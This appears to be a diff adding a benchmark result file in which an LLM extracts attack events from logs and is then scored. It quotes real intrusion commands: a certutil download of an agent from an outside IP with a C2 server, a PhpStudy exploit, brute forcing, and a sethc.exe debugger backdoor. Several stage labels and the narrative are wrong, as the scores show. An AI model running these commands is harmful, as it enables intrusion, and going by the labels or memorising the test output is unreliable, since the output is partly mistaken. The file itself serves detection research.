@@ -1,0 +1,92 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd /c python PhpStudyExp2.py http://121.36.30.176/ \"whoami & arp -a & ipconfig & ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd /c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd /c nbtscan.exe 192.168.0.244/24",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd /c PAExec.exe \\\\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attack begins with an initial access using CertUtil to download a remote executable named 'agent.exe'. This malware establishes persistence through registry modifications enabling RDP and altering the sethc.exe debugger entry to spawn a shell. Further actions include discovery via various commands like whoami and ipconfig over PowerShell and CMD processes, credential acquisition attempts using brute force tools against SSH services, lateral movement attempts within the internal network utilizing NBTScan and PAExec to execute IPConfig remotely on target hosts, and ultimately maintaining continuous communication back to the attacker\u2019s server for further directives.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 9414,
+      "completion_tokens": 703,
+      "total_tokens": 10117,
+      "wall_clock_s": 15.196,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5,
+      "recall": 0.8333333333333334,
+      "f1": 0.625,
+      "tp": 5,
+      "fp": 5,
+      "fn": 1
+    },
+    "stage": {
+      "precision": 0.3,
+      "recall": 0.5,
+      "f1": 0.37499999999999994,
+      "tp": 3,
+      "fp": 7,
+      "fn": 3,
+      "recall_partial": 0.6666666666666666
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 9414,
+      "completion_tokens": 703,
+      "total_tokens": 10117,
+      "wall_clock_s": 15.196,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
